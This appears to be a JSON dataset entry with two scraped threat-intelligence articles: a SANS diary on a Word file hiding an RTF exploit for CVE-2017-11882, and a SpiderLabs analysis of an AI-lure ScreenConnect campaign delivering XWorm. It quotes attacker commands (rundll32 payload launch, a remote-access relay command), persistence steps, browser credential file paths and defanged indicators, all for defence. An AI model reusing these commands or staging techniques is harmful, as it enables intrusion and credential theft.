[
  {
    "url": "https://isc.sans.edu/diary/rss/32484",
    "title": "Microsoft Office Russian Dolls - SANS Internet Storm Center",
    "content": "Microsoft Office Russian Dolls - SANS Internet Storm Center Internet Storm Center Sign In Sign Up Handler on Duty: Guy Bruneau Threat Level: green previous next My next class: Reverse-Engineering Malware: Advanced Code Analysis Amsterdam Mar 16th - Mar 20th 2026 Microsoft Office Russian Dolls Published : 2025-11-14. Last Updated : 2025-11-14 13:42:55 UTC by Xavier Mertens (Version: 1) 0 comment(s) You probably know what are the Russian or Matryoshka dolls. It's a set of wooden dolls of decreasing size placed one inside another[ 1 ]. I found an interesting Microsoft Office document that behaves like this. There was a big decrease in malicious Office documents due to the new Microsoft rules to prevent automatic VBA macros execution. But they remain used, especially RTF documents that exploits the good CVE-2017-11882 . The document (SHA256:8437cf40bdd8b005b239c163e774ec7178195f0b80c75e8d27a773831479f68f) that I found uses another technique to prevent the RTF document to be spread directly to the victim. The RTF document is placed into the OOXML document: remnux@remnux:~/malwarezoo/20251113$ zipdump.py mexico_november_po.docx Index Filename Encrypted Timestamp 1 _rels/ 0 2025-10-22 21:55:10 2 docProps/ 0 2025-10-22 21:55:10 3 word/ 0 2025-11-12 02:58:50 4 [Content_Types].xml 0 2025-10-22 21:55:22 5 docProps/app.xml 0 1980-01-01 00:00:00 6 docProps/core.xml 0 1980-01-01 00:00:00 7 word/_rels/ 0 2025-10-22 21:55:10 8 word/theme/ 0 2025-10-22 21:55:10 9 word/document.xml 0 2025-11-12 02:59:04 10 word/endnotes.xml 0 1980-01-01 00:00:00 11 word/Engaging.rtf 0 2025-11-12 02:58:34 12 word/fontTable.xml 0 1980-01-01 00:00:00 13 word/footer1.xml 0 1980-01-01 00:00:00 14 word/footnotes.xml 0 1980-01-01 00:00:00 15 word/numbering.xml 0 1980-01-01 00:00:00 16 word/settings.xml 0 1980-01-01 00:00:00 17 word/styles.xml 0 1980-01-01 00:00:00 18 word/webSettings.xml 0 1980-01-01 00:00:00 19 word/theme/theme1.xml 0 1980-01-01 00:00:00 20 word/_rels/document.xml.rels 0 2025-11-12 02:58:58 21 word/_rels/settings.xml.rels 0 1980-01-01 00:00:00 22 _rels/.rels 0 1980-01-01 00:00:00 The file is referenced in the Word document: remnux@remnux:~/malwarezoo/20251113$ zipdump.py mexico_november_po.docx -s 20 -d | grep Engaging.rtf <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"> ... <Relationship Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk\" Target=\" /word/Engaging.rtf \" Id=\" YAjq8U \"/> </Relationships> remnux@remnux:~/malwarezoo/20251113$ zipdump.py mexico_november_po.docx -s 9 -d | grep YAjq8U <w:document xmlns:wpc=\u201chttp://schemas.microsoft.com/office/word/2010/wordprocessingCanvas\u201d ... <w:body><w:altChunk r:id=\u201c YAjq8U \u201d/> ... </w:document> The RTF document contains a shellcode that triggers the Equation Editor exploit. The next payload is C:\\Users\\user01\\AppData\\Local\\Temp\\license.ini. It's a DLL (SHA256:d8ed658cc3d0314088cf8135399dbba9511e7f117d5ec93e6acc757b43e58dbc) that is invoked with the following function: IEX CmD.exe /C rundll32 %tmp%\\license.ini,IEX A\\x12\\x0cC You can see the special characters used as parameters to the function here: This DLL is pretty well obfuscated, I'l still having a look at it but the malware family is not sure... Maybe another Formbook. [1] https://en.wikipedia.org/wiki/Matryoshka_doll Xavier Mertens (@xme) Xameco Senior ISC Handler - Freelance Cyber Security Consultant PGP Key Keywords: Malware Microsoft Office RTF 0 comment(s) My next class: Reverse-Engineering Malware: Advanced Code Analysis Amsterdam Mar 16th - Mar 20th 2026 previous next Comments Login here to join the discussion. Top of page \u00d7 Diary Archives Homepage Diaries Podcasts Jobs Data TCP/UDP Port Activity Port Trends SSH/Telnet Scanning Activity Weblogs Domains Threat Feeds Activity Threat Feeds Map Useful InfoSec Links Presentations & Papers Research Papers API Tools DShield Sensor DNS Looking Glass Honeypot (RPi/AWS) InfoSec Glossary Contact Us Contact Us About Us Handlers About Us Slack Channel Mastodon Bluesky X \u00a9 2026 SANS\u2122 Internet Storm Center Developers: We have an API for you! Link To Us About Us Handlers Privacy Policy",
    "filtered_content": "Microsoft Office Russian Dolls - SANS Internet Storm Center Internet Storm Center Sign In Sign Up Handler on Duty: Guy Bruneau Threat Level: green previous next My next class: Reverse-Engineering Malware: Advanced Code Analysis Amsterdam Mar 16th - Mar 20th 2026 Microsoft Office Russian Dolls Published : 2025-11-14. Last Updated : 2025-11-14 13:42:55 UTC by Xavier Mertens (Version: 1) 0 comment(s) You probably know what are the Russian or Matryoshka dolls. It's a set of wooden dolls of decreasing size placed one inside another[ 1 ]. I found an interesting Microsoft Office document that behaves like this. There was a big decrease in malicious Office documents due to the new Microsoft rules to prevent automatic VBA macros execution. But they remain used, especially RTF documents that exploits the good CVE-2017-11882 . The document (SHA256:8437cf40bdd8b005b239c163e774ec7178195f0b80c75e8d27a773831479f68f) that I found uses another technique to prevent the RTF document to be spread directly to the victim. The RTF document is placed into the OOXML document: remnux@remnux:~/malwarezoo/20251113$ zipdump.py mexico_november_po.docx Index Filename Encrypted Timestamp 1 _rels/ 0 2025-10-22 21:55:10 2 docProps/ 0 2025-10-22 21:55:10 3 word/ 0 2025-11-12 02:58:50 4 [Content_Types].xml 0 2025-10-22 21:55:22 5 docProps/app.xml 0 1980-01-01 00:00:00 6 docProps/core.xml 0 1980-01-01 00:00:00 7 word/_rels/ 0 2025-10-22 21:55:10 8 word/theme/ 0 2025-10-22 21:55:10 9 word/document.xml 0 2025-11-12 02:59:04 10 word/endnotes.xml 0 1980-01-01 00:00:00 11 word/Engaging.rtf 0 2025-11-12 02:58:34 12 word/fontTable.xml 0 1980-01-01 00:00:00 13 word/footer1.xml 0 1980-01-01 00:00:00 14 word/footnotes.xml 0 1980-01-01 00:00:00 15 word/numbering.xml 0 1980-01-01 00:00:00 16 word/settings.xml 0 1980-01-01 00:00:00 17 word/styles.xml 0 1980-01-01 00:00:00 18 word/webSettings.xml 0 1980-01-01 00:00:00 19 word/theme/theme1.xml 0 1980-01-01 00:00:00 20 word/_rels/document.xml.rels 0 2025-11-12 02:58:58 21 word/_rels/settings.xml.rels 0 1980-01-01 00:00:00 22 _rels/.rels 0 1980-01-01 00:00:00 The file is referenced in the Word document: remnux@remnux:~/malwarezoo/20251113$ zipdump.py mexico_november_po.docx -s 20 -d | grep Engaging.rtf <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"> ... <Relationship Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk\" Target=\" /word/Engaging.rtf \" Id=\" YAjq8U \"/> </Relationships> remnux@remnux:~/malwarezoo/20251113$ zipdump.py mexico_november_po.docx -s 9 -d | grep YAjq8U <w:document xmlns:wpc=\u201chttp://schemas.microsoft.com/office/word/2010/wordprocessingCanvas\u201d ... <w:body><w:altChunk r:id=\u201c YAjq8U \u201d/> ... </w:document> The RTF document contains a shellcode that triggers the Equation Editor exploit. The next payload is C:\\Users\\user01\\AppData\\Local\\Temp\\license.ini. It's a DLL (SHA256:d8ed658cc3d0314088cf8135399dbba9511e7f117d5ec93e6acc757b43e58dbc) that is invoked with the following function: IEX CmD.exe /C rundll32 %tmp%\\license.ini,IEX A\\x12\\x0cC You can see the special characters used as parameters to the function here: This DLL is pretty well obfuscated, I'l still having a look at it but the malware family is not sure... Maybe another Formbook. [1] https://en.wikipedia.org/wiki/Matryoshka_doll Xavier Mertens (@xme) Xameco Senior ISC Handler - Freelance Cyber Security Consultant PGP Key Keywords: Malware Microsoft Office RTF 0 comment(s) My next class: Reverse-Engineering Malware: Advanced Code Analysis Amsterdam Mar 16th - Mar 20th 2026 previous next Comments Login here to join the discussion. Top of page \u00d7 Diary Archives Homepage Diaries Podcasts Jobs Data TCP/UDP Port Activity Port Trends SSH/Telnet Scanning Activity Weblogs Domains Threat Feeds Activity Threat Feeds Map Useful InfoSec Links Presentations & Papers Research Papers API Tools DShield Sensor DNS Looking Glass Honeypot (RPi/AWS) InfoSec Glossary Contact Us Contact Us About Us Handlers About Us Slack Channel Mastodon Bluesky X \u00a9 2026 SANS\u2122 Internet Storm Center Developers: We have an API for you! Link To Us About Us Handlers Privacy Policy",
    "expected_count": 1
  },
  {
    "url": "https://levelblue.com/blogs/spiderlabs-blog/malicious-screen-connect-campaign-abuses-ai-themed-lures-for-xworm-delivery",
    "title": "Malicious Screen Connect Campaign Abuses AI-Themed Lures for Xworm Delivery",
    "content": "Malicious Screen Connect Campaign Abuses AI-Themed Lures for Xworm Delivery LevelBlue Acquires Fortra\u2019s Alert Logic MDR Business, Strengthening Position as Global MDR Leader. Learn More Government Contact Us Login USM Anywhere Login Fusion Platform Login MailMarshal Cloud Login Incident Response Experiencing a security breach? Access immediate incident response support, available 24/7 24 HOUR HOTLINES AMERICAS +1 855 438 4305 EMEA +44 8081687370 AUSTRALIA +61 1300901211 SINGAPORE +65 68175019 Recommended Actions Services Solutions Why LevelBlue Partners Resources Incident Response Incident Response Experiencing a security breach? Access immediate incident response support, available 24/7 24 HOUR HOTLINES AMERICAS +1 855 438 4305 EMEA +44 8081687370 AUSTRALIA +61 1300901211 SINGAPORE +65 68175019 Recommended Actions Submit RFP Government Contact Us Login login USM Anywhere Login Fusion Platform Login MailMarshal Cloud Login Request a Demo LevelBlue Acquires Fortra\u2019s Alert Logic MDR Business, Strengthening Position as Global MDR Leader. Learn More Submit RFP Request a Demo Services Cyber Advisory Managed Cloud Security Data Security Managed Detection & Response Email Security Managed Network Infrastructure Security Exposure Management Security Operations Platforms Incident Readiness & Response SpiderLabs Threat Intelligence View All Services Solutions BY INDUSTRY Education Financial Services Government Healthcare Retail & Hospitality Legal Manufacturing Technology Energy & Utilities BY REGULATION Data Privacy CMMC FISMA GDPR GLBA HIPAA ISO SOX BY TOPIC Offensive Security Solutions to maximize your security ROI Operational Technology End-to-end OT security Microsoft Security Unlock the full power of Microsoft Security Securing the IoT Landscape Test, monitor and secure network objects Why LevelBlue About Us We reduce cyber risk and build resilience Awards and Accolades The most recognized cybersecurity leader LevelBlue SpiderLabs Elite global threat experts and intelligence PGA of America Partnership Cybersecurity at the championship level Secure What's Next Future-proof your organization LevelBlue Security Operations Platforms Unprecedented security visibility and control Security Colony Cybersecurity threat protection resources Partners Microsoft Unlock the full power of Microsoft Security Technology Alliance Partners Key alliances who align and support our ecosystem of security offerings Register Login Resources BLOGS LevelBlue Blog SpiderLabs Blog UPCOMING Webinars Events MEDIA & ASSETS Resource Library Videos Analyst Reports Webinar Replays Case Studies Free Trials NOTICES Security Advisories Software Updates HELP Contact Support Home SpiderLabs Blog Malicious Screen Connect Campaign Abuses AI-Themed Lures for Xworm Delivery Change theme to light August 27, 2025 6 Minute Read by Boles\u0142aw Szo\u0142tysik, Chris Tomboc, Serhii Melnyk During a recent Advanced Continual Threat Hunt (ACTH) investigation, the Trustwave SpiderLabs Threat Hunt team identified a deceptive campaign that abused fake AI-themed content to lure users into executing a malicious, pre-configured ScreenConnect installer. While the binary was digitally signed and masqueraded as legitimate, human-led analysis revealed a concealed Remote Access Trojan (RAT) functionality and a multi-stage infection chain involving a GitHub-hosted payload aiming to infect the victims\u2019 host with an Xworm \u2014 a commonly known RAT available through the malware-as-a-service model. Notably, many stages of this campaign bypassed EDR alerting and required manual timeline review within Defender to identify malicious behavior, highlighting the crucial role of threat hunting in modern detection strategies. Initial access: The initial access and delivery of the ScreenConnect remote management tool identified by the team were obtained by tricking users into downloading a disguised, modified installer. To do so, the threat actors used many social engineering techniques such as phishing, malvertising or social media posts. In one observed case, a user was tricked into visiting a fake AI website \u201cgtpgrok[.]ai\u201d (currently offline), which redirected them to a suspicious website \u201canhemvn6[.]com\u201d. Figure 1. Screenshots of gptgrok[.]ai (left) and anhemvn6[.]com (right) when sites were still active. Immediately after a download of ScreenConnect installer started, to not raise users\u2019 suspicious and convince them to run the file, it was named \u201cCreation_Made_By_GrokAI.mp4 Grok.com.\u201d However, an analysis of said file shows that it\u2019s in fact \u201cScreenConnect.ClientSetup.msi\u201d. Further campaign analysis showed similar cases when the malicious file was also seen with different names such as: Creation_Made_By_GoogleAI.mp4 Google.com Creation_Mad e_By_DeepSeek.mp4 DeepSeek.com C reation_Made_By_SoraAI.mp4 OpenAI.com Analysis of this executable showed that it drops the ScreenConnect binary in the Temp directory. This is then automatically executed and continues to run in the background. Figure 2. ScreenConnect client running in the background. This client was pre-configured to run hidden from the user\u2019s sight and connect to a remote ScreenConnect server controlled by the threat actor. Figure 3. Some of the Creation_Made_By_GrokAI.mp4 Grok.com configuration settings. The following command was used to establish a remote access session: \"ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-keoxeq-relay[.]screenconnect[.]com&p=443&s=44f &k=BgIAAA &c=GROKgpt\" Table 1. Parameters for remote session controlled by the threat actor. Interestingly, collected samples showed that the threat actors manipulated Authenticode \u2014 Microsoft code-signing technology \u2014 to embed malicious configurations within the digital signature of the legitimate ScreenConnect binary. This allowed the attacker to modify the behavior of the application without invalidating its digital signature. Figure 4. Endpoint detection and response (EDR) solution recognizing a valid signature for a modified ScreenConnect installer. Once installed, the ScreenConnect client successfully establishes a remote session controlled by the attacker allowing for further execution of the kill chain. Thanks to this modified configuration, it is not visible to a user as all visual indicators (icons, pop-ups, tray messages) were turned off. Execution: During the remote session, we observed that a particular file called \u201cX-META Firebase_crypted.bat\u201d was dropped and executed on the victim\u2019s machine. This X-META Firebase_crypted.bat led to mshta.exe executing a script (IWshShell3.Run(\"\"C:\\Users\\Mguise\\ONEDRI~1\\DOCUME~1\\loadding\\Temp\\X-META~1.BAT\" ::\", \"0\".) It appears the main purpose of this activity was to start cmd.exe and execute a set of commands that led to the download and extraction of a zip archive (\u201c5btc.zip\u201d). The domain hosting this archive used the same naming convention used during delivery of ScreenConnect installer: \u201canhemvn4[.]com.\u201d Files were extracted to a new folder called \u201cxmetavip\u201d, which was located directly under C:\\ drive. After archive extraction, we observed the execution of pythonw.exe renamed to pw.exe (delivered in a zip file) which runs Base64-encoded command. After decoding it, we identified that it was an attempt to execute Python code located on a public GitHub repository (hxxps[://]github[.]com/trieule99911/vianhthuongbtc). With this fileless execution, threat actors likely aimed to evade static detection mechanisms, which would be triggered if the file \u201cbasse64.txt\u201d were delivered in \u201c5btc.zip\u201d. Figure 5. pw.exe (pythonw.exe) encoded command \u2014 view from the EDR console. Figure 6. basse64.txt being recognized as a known stealer on VirusTotal. Although the file content was encoded with Base64 and was highly obfuscated, it was identified to perform process injection (in the observed case, into a chrome.exe and msedge.exe) processes that were spawned when pw.exe was executed following the process hollowing (T1055.012) technique scenario. Those instances of web browsers were also launched on a hidden desktop to avoid detection by a legitimate user (T1564.003.) Dedicated to hunting and eradicating the world\u2019s most challenging threats. SpiderLabs Persistence: During the execution of \u201cX-META Firebase_crypted.bat\u201d, we also observed that apart from downloading the \u201c5btc.zip\u201d archive, it also ran encoded and obfuscated Python commands and code. Aside from that, a persistence mechanism was implemented on the host. A registry run key was modified (T1547.001) to run a specified command on each user login. As shown in Figure 7, a reg.exe command was used to add the Windows Security (the name used mimics a legitimate system component most likely to make detection harder) value in HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Data added to the registry led to one of the files being delivered in a zip archive: \u201cC:\\xmetavip\\backup.bat\u201d. With this configuration, \u201cbackup.bat\u201d will be executed whenever a user logs onto their machine. Figure 7. Command line used to implement persistence. The implementation of this persistence mechanism proved during the investigation, as we observed the execution of the bat script. As per the analyzed event, its main goal was to abuse the renamed pythonw.exe (delivered in initial stages) and execute similar encoded Python commands to run obfuscated code located on the same GitHub repository also observed in initial stages. Figure 8. pw.exe executed by a persistence mechanism and the decoded content of its command line This time, the decoded content showed a different file, \u201cbuquabua.txt .\u201c Credential Access and Discovery: During the execution chain, we observed several events indicating attempts at Credential Access and Discovery. For Discovery, we identified WMI query executions used to extract detailed information about the current operating system (T1082) and to gather data on installed antivirus products (T1518.001). Additionally, pw.exe attempted to access sensitive browser-related files (T1555.003), such as: \\Device\\HarddiskVolume3\\Users\\ \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data \\Device\\HarddiskVolume3\\Users\\\\ \\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data \\ Device\\HarddiskVolume3\\Users\\\\ \\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\nd5ol1v2.default-release-1706746804908\\key4.db \\ Device\\HarddiskVolum e3\\\\ \\Mguise\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\nd5ol1v2.default-release-1706746804908\\logins.json Additional Artifacts Observed: During the team\u2019s investigation, we discovered that the GitHub repository hosting the malicious code contained not only two files directly observed in the attack chain, but in fact it hosted 11 files in total and was also created only a week prior to the observed malicious activities. All the files, which were disguised as text files, contained a highly obfuscated Python code that was ultimately encoded with base64. To better understand this campaign, the SpiderLabs team analyzed the files from the public repository referenced in the described attack chain. Extracted strings show that most of the files share the same behavior patterns where they implement a persistence mechanism via a registry key. The name of the value implemented in the registry varies but always tries to mimic legitimate system operation. Names like: UpdateWins WindowsSecurity were observed. Additionally, files located in this repository can be divided into two groups. The first is responsible for creating persistence. They are also responsible for downloading and injecting files from the second group into legitimate processes. Files from the second group serve as a final payload and are more complex. These contain multiple execution layers and their behavior and content attribute them to a commonly known yet still evolving malware-as-a-service RAT \u2014 XWorm. During binary analysis, the SpiderLabs team was also able to extract a command-and-control (C2) IP used in one of the final payload scripts (\u201cExppiyt.txt\u201d). The IP extracted is 5[.]181[.]165[.]102:7705 and at the time of analysis was not recognized as malicious on VirusTotal. Figure 9. VirusTotal search result for the supposed C2 IP extracted from the binary injected during the attack chain. Summary: The observed activities reflect a broader and increasingly sophisticated trend among threat actors: leveraging AI-related branding and repurposing legitimate remote access tools to distribute commodity malware. This particular campaign, uncovered by the SpiderLabs Threat Hunt Team, demonstrates how attackers are exploiting people\u2019s current fascination with AI to enhance the credibility and appeal of their social engineering tactics. Adversaries can bypass traditional detection mechanisms and infiltrate target environments with alarming efficiency. What sets this investigation apart is not just the technical findings, but the methodology behind them. This was a hunt-driven investigation, powered by human-led analysis \u2014 a critical component in identifying threats that evade automated systems. While machine learning and automated detection play a vital role in modern cybersecurity, they are not infallible. Sophisticated adversaries are increasingly designing campaigns to slip past these defenses, making expert-driven threat hunting more essential than ever. The SpiderLabs Threat Hunt Team\u2019s findings prove the value of proactive, human-centric threat analysis. It also reinforces the strategic importance of investing in skilled threat hunters who can think like adversaries, adapt to evolving tradecraft, and uncover hidden threats before they cause damage. In an era where attackers are constantly innovating, SpiderLabs\u2019 threat hunting provides organizations with a crucial advantage \u2014 combining deep technical expertise with investigative rigor to stay ahead of the curve. Their work not only protects clients from immediate threats but also contributes to the broader cybersecurity community by exposing emerging tactics and techniques. Appendix \u2013 Indicators of compromise: URLs hxxps://gptgrok[.]ai hxxps://anhemvn6[.]com hxxps://anhemvn4[.]com/5btc[.]zip hxxps://github[.]com/trieule99911/vianhthuongbtc h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/basse64.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/backpuppure.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/abcdegia.txt h xxps://raw.githu busercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/Nhwneafyp.txt h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/Hzcbmqnqwlv.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/Exppiyt.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/x-metavn.txt h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/purecoookielog.txt h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/exepurelog.txt h xxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/cccccccccccccccccccccccc.txt hxxps://raw.githubusercontent[.]com/trieule99911/vianhthuongbtc/refs/heads/main/buquabua.txt C2 IP: 5[.]181[.]165[.]102[:]7705 Share: Copy Link Link Copied v2 LinkedIn X Facebook Stay Informed Sign up to receive the latest security news and trends straight to your inbox from LevelBlue. Stay Informed: Subscribe Stay Informed Sign up to receive the latest security news and trends straight to your inbox from LevelBlue. RESEARCH REPORT 2025 LevelBlue Threat Trends Report, Edition Two WEBINAR Fool Me Once: How Cybercriminals are Perfecting Deception ABOUT LEVELBLUE LevelBlue is a globally recognized cybersecurity leader that reduces cyber risk and fortifies organizations against disruptive and damaging cyber threats. Our comprehensive offensive and defensive cybersecurity portfolio detects what others cannot, responds with greater speed and effectiveness, optimizes client investment, and improves security resilience. Learn more about us . Artificial Intelligence Threat Hunting Latest Intelligence Stealerium Unmasked: Inside a Multi-Lure, Multi-Stage Stealer Campaign Notepad-Plus Fuss: Notepad++ Supply Chain Attack Analysis 19 Shades of LockBit5.0, Inside the Latest Cross-Platform Ransomware\u2019s Newest Leaked Samples: Part 3 Related Offerings Penetration Testing Incident Readiness and Response Cyber Threat Intelligence Threat Hunting Discover how our specialists can tailor a security program to fit the needs of your organization. Request a Demo Stay Informed Sign up to receive the latest security news and trends straight to your inbox from LevelBlue. Leadership Our History Press Releases Media Coverage Careers Contact View All Services Free Trials Training & Certification Support Success Center Documentation Center Legal Terms of Usage Privacy Policy Your Privacy Choices \u00a9 Copyright 2026",
    "filtered_content": "Malicious Screen Connect Campaign Abuses AI-Themed Lures for Xworm Delivery LevelBlue Acquires Fortra\u2019s Alert Logic MDR Business, Strengthening Position as Global MDR Leader. Learn More Government Contact Us Login USM Anywhere Login Fusion Platform Login MailMarshal Cloud Login Incident Response Experiencing a security breach? Access immediate incident response support, available 24/7 24 HOUR HOTLINES AMERICAS +1 855 438 4305 EMEA +44 8081687370 AUSTRALIA +61 1300901211 SINGAPORE +65 68175019 Recommended Actions Services Solutions Why LevelBlue Partners Resources Incident Response Incident Response Experiencing a security breach? Access immediate incident response support, available 24/7 24 HOUR HOTLINES AMERICAS +1 855 438 4305 EMEA +44 8081687370 AUSTRALIA +61 1300901211 SINGAPORE +65 68175019 Recommended Actions Submit RFP Government Contact Us Login login USM Anywhere Login Fusion Platform Login MailMarshal Cloud Login Request a Demo LevelBlue Acquires Fortra\u2019s Alert Logic MDR Business, Strengthening Position as Global MDR Leader. Learn More Submit RFP Request a Demo Services Cyber Advisory Managed Cloud Security Data Security Managed Detection & Response Email Security Managed Network Infrastructure Security Exposure Management Security Operations Platforms Incident Readiness & Response SpiderLabs Threat Intelligence View All Services Solutions BY INDUSTRY Education Financial Services Government Healthcare Retail & Hospitality Legal Manufacturing Technology Energy & Utilities BY REGULATION Data Privacy CMMC FISMA GDPR GLBA HIPAA ISO SOX BY TOPIC Offensive Security Solutions to maximize your security ROI Operational Technology End-to-end OT security Microsoft Security Unlock the full power of Microsoft Security Securing the IoT Landscape Test, monitor and secure network objects Why LevelBlue About Us We reduce cyber risk and build resilience Awards and Accolades The most recognized cybersecurity leader LevelBlue SpiderLabs Elite global threat experts and intelligence PGA of America Partnership Cybersecurity at the championship level Secure What's Next Future-proof your organization LevelBlue Security Operations Platforms Unprecedented security visibility and control Security Colony Cybersecurity threat protection resources Partners Microsoft Unlock the full power of Microsoft Security Technology Alliance Partners Key alliances who align and support our ecosystem of security offerings Register Login Resources BLOGS LevelBlue Blog SpiderLabs Blog UPCOMING Webinars Events MEDIA & ASSETS Resource Library Videos Analyst Reports Webinar Replays Case Studies Free Trials NOTICES Security Advisories Software Updates HELP Contact Support Home SpiderLabs Blog Malicious Screen Connect Campaign Abuses AI-Themed Lures for Xworm Delivery Change theme to light August 27, 2025 6 Minute Read by Boles\u0142aw Szo\u0142tysik, Chris Tomboc, Serhii Melnyk During a recent Advanced Continual Threat Hunt (ACTH) investigation, the Trustwave SpiderLabs Threat Hunt team identified a deceptive campaign that abused fake AI-themed content to lure users into executing a malicious, pre-configured ScreenConnect installer. While the binary was digitally signed and masqueraded as legitimate, human-led analysis revealed a concealed Remote Access Trojan (RAT) functionality and a multi-stage infection chain involving a GitHub-hosted payload aiming to infect the victims\u2019 host with an Xworm \u2014 a commonly known RAT available through the malware-as-a-service model. Notably, many stages of this campaign bypassed EDR alerting and required manual timeline review within Defender to identify malicious behavior, highlighting the crucial role of threat hunting in modern detection strategies. Initial access: The initial access and delivery of the ScreenConnect remote management tool identified by the team were obtained by tricking users into downloading a disguised, modified installer. To do so, the threat actors used many social engineering techniques such as phishing, malvertising or social media posts. In one observed case, a user was tricked into visiting a fake AI website \u201cgtpgrok[.]ai\u201d (currently offline), which redirected them to a suspicious website \u201canhemvn6[.]com\u201d. Figure 1. Screenshots of gptgrok[.]ai (left) and anhemvn6[.]com (right) when sites were still active. Immediately after a download of ScreenConnect installer started, to not raise users\u2019 suspicious and convince them to run the file, it was named \u201cCreation_Made_By_GrokAI.mp4 Grok.com.\u201d However, an analysis of said file shows that it\u2019s in fact \u201cScreenConnect.ClientSetup.msi\u201d. Further campaign analysis showed similar cases when the malicious file was also seen with different names such as: Creation_Made_By_GoogleAI.mp4 Google.com Creation_Mad e_By_DeepSeek.mp4 DeepSeek.com C reation_Made_By_SoraAI.mp4 OpenAI.com Analysis of this executable showed that it drops the ScreenConnect binary in the Temp directory. This is then automatically executed and continues to run in the background. Figure 2. ScreenConnect client running in the background. This client was pre-configured to run hidden from the user\u2019s sight and connect to a remote ScreenConnect server controlled by the threat actor. Figure 3. Some of the Creation_Made_By_GrokAI.mp4 Grok.com configuration settings. The following command was used to establish a remote access session: \"ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-keoxeq-relay[.]screenconnect[.]com&p=443&s=44f &k=BgIAAA &c=GROKgpt\" Table 1. Parameters for remote session controlled by the threat actor. Interestingly, collected samples showed that the threat actors manipulated Authenticode \u2014 Microsoft code-signing technology \u2014 to embed malicious configurations within the digital signature of the legitimate ScreenConnect binary. This allowed the attacker to modify the behavior of the application without invalidating its digital signature. Figure 4. Endpoint detection and response (EDR) solution recognizing a valid signature for a modified ScreenConnect installer. Once installed, the ScreenConnect client successfully establishes a remote session controlled by the attacker allowing for further execution of the kill chain. Thanks to this modified configuration, it is not visible to a user as all visual indicators (icons, pop-ups, tray messages) were turned off. Execution: During the remote session, we observed that a particular file called \u201cX-META Firebase_crypted.bat\u201d was dropped and executed on the victim\u2019s machine. This X-META Firebase_crypted.bat led to mshta.exe executing a script (IWshShell3.Run(\"\"C:\\Users\\Mguise\\ONEDRI~1\\DOCUME~1\\loadding\\Temp\\X-META~1.BAT\" ::\", \"0\".) It appears the main purpose of this activity was to start cmd.exe and execute a set of commands that led to the download and extraction of a zip archive (\u201c5btc.zip\u201d). The domain hosting this archive used the same naming convention used during delivery of ScreenConnect installer: \u201canhemvn4[.]com.\u201d Files were extracted to a new folder called \u201cxmetavip\u201d, which was located directly under C:\\ drive. After archive extraction, we observed the execution of pythonw.exe renamed to pw.exe (delivered in a zip file) which runs Base64-encoded command. After decoding it, we identified that it was an attempt to execute Python code located on a public GitHub repository (hxxps[://]github[.]com/trieule99911/vianhthuongbtc). With this fileless execution, threat actors likely aimed to evade static detection mechanisms, which would be triggered if the file \u201cbasse64.txt\u201d were delivered in \u201c5btc.zip\u201d. Figure 5. pw.exe (pythonw.exe) encoded command \u2014 view from the EDR console. Figure 6. basse64.txt being recognized as a known stealer on VirusTotal. Although the file content was encoded with Base64 and was highly obfuscated, it was identified to perform process injection (in the observed case, into a chrome.exe and msedge.exe) processes that were spawned when pw.exe was executed following the process hollowing (T1055.012) technique scenario. Those instances of web browsers were also launched on a hidden desktop to avoid detection by a legitimate user (T1564.003.) Dedicated to hunting and eradicating the world\u2019s most challenging threats. SpiderLabs Persistence: During the execution of \u201cX-META Firebase_crypted.bat\u201d, we also observed that apart from downloading the \u201c5btc.zip\u201d archive, it also ran encoded and obfuscated Python commands and code. Aside from that, a persistence mechanism was implemented on the host. A registry run key was modified (T1547.001) to run a specified command on each user login. As shown in Figure 7, a reg.exe command was used to add the Windows Security (the name used mimics a legitimate system component most likely to make detection harder) value in HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Data added to the registry led to one of the files being delivered in a zip archive: \u201cC:\\xmetavip\\backup.bat\u201d. With this configuration, \u201cbackup.bat\u201d will be executed whenever a user logs onto their machine. Figure 7. Command line used to implement persistence. The implementation of this persistence mechanism proved during the investigation, as we observed the execution of the bat script. As per the analyzed event, its main goal was to abuse the renamed pythonw.exe (delivered in initial stages) and execute similar encoded Python commands to run obfuscated code located on the same GitHub repository also observed in initial stages. Figure 8. pw.exe executed by a persistence mechanism and the decoded content of its command line This time, the decoded content showed a different file, \u201cbuquabua.txt .\u201c Credential Access and Discovery: During the execution chain, we observed several events indicating attempts at Credential Access and Discovery. For Discovery, we identified WMI query executions used to extract detailed information about the current operating system (T1082) and to gather data on installed antivirus products (T1518.001). Additionally, pw.exe attempted to access sensitive browser-related files (T1555.003), such as: \\Device\\HarddiskVolume3\\Users\\ \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data \\Device\\HarddiskVolume3\\Users\\\\ \\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data \\ Device\\HarddiskVolume3\\Users\\\\ \\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\nd5ol1v2.default-release-1706746804908\\key4.db \\ Device\\HarddiskVolum e3\\\\ \\Mguise\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\nd5ol1v2.default-release-1706746804908\\logins.json Additional Artifacts Observed: During the team\u2019s 